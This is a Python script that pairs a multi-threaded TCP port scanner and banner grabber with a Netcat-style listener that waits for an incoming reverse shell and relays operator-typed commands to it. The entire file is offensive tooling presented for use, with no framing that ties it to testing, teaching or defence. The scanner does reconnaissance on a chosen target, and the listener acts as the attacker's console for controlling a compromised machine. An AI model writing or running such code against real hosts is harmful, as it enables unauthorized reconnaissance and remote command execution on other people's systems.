import socket
import threading
from queue import Queue
from datetime import datetime

# Function to start a Netcat-like listener for reverse shell
def start_listener(listen_host, listen_port):
    try:
        # Create a socket object for listening (like Netcat)
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.bind((listen_host, listen_port))  # Bind to the IP and port
        listener.listen(1)  # Listen for one incoming connection
        print(f"[+] Listening on {listen_host}:{listen_port} for incoming connections...")

        # Accept an incoming connection
        conn, addr = listener.accept()
        print(f"[+] Connection received from {addr}")
        print("[*] You now have an active reverse shell!")

        # Keep the connection open to interact with the shell
        while True:
            command = input("Shell> ")  # Input a command to send to the reverse shell
            if command.lower() == "exit":  # Close the connection if the user types 'exit'
                conn.send(command.encode())
                conn.close()
                break
            conn.send(command.encode())  # Send the command to the reverse shell
            response = conn.recv(4096).decode()  # Receive the command's output
            print(response)  # Display the output
    except Exception as e:
        print(f"Error: {e}")
    finally:
        listener.close()

# Function to scan a specific port
def scan_port(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        if result == 0:
            banner = grab_banner(host, port)
            print(f"Port {port} is open", end="")
            if banner:
                print(f" | Banner: {banner}")
            else:
                print(f" | Service: {socket.getservbyport(port, 'tcp')} (unknown banner)")
            open_ports.append(port)
    except:
        pass
    finally:
        sock.close()

# Function to grab banner from a port
def grab_banner(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        sock.connect((host, port))
        banner = sock.recv(1024).decode().strip()
        return banner
    except:
        return None
    finally:
        sock.close()

# Worker thread function to process ports from the queue
def thread_worker(host):
    while not port_queue.empty():
        port = port_queue.get()
        scan_port(host, port)
        port_queue.task_done()

# Function to start multi-threaded port scan
def scan_ports_multithreaded(host, start_port, end_port, num_threads):
    print(f"Scanning host: {host}")
    print(f"Time started: {datetime.now()}")
    print(f"Scanning ports from {start_port} to {end_port}...\n")
    
    for port in range(start_port, end_port + 1):
        port_queue.put(port)

    for _ in range(num_threads):
        thread = threading.Thread(target=thread_worker, args=(host,))
        thread.daemon = True
        thread.start()

    port_queue.join()  # Wait for all threads to complete

    if open_ports:
        print(f"\nOpen ports: {open_ports}")
    else:
        print("\nNo open ports found.")
    
    print(f"Time finished: {datetime.now()}")

# Create a listener in a separate thread so that it can run alongside the port scan
def listener_thread(listen_host, listen_port):
    thread = threading.Thread(target=start_listener, args=(listen_host, listen_port))
    thread.daemon = True
    thread.start()

# Specify target and port range for scanning
target_host = input("Enter the target IP address or hostname: ")
start_port = int(input("Enter the start port: "))
end_port = int(input("Enter the end port: "))
num_threads = int(input("Enter the number of threads (e.g., 10): "))

# Specify listener details
listen_host = input("Enter the listener IP address: ")
listen_port = int(input("Enter the listener port: "))

# Create a queue and a list to store open ports
port_queue = Queue()
open_ports = []

# Start the listener in a separate thread
listener_thread(listen_host, listen_port)

# Start scanning with multi-threading
scan_ports_multithreaded(target_host, start_port, end_port, num_threads)
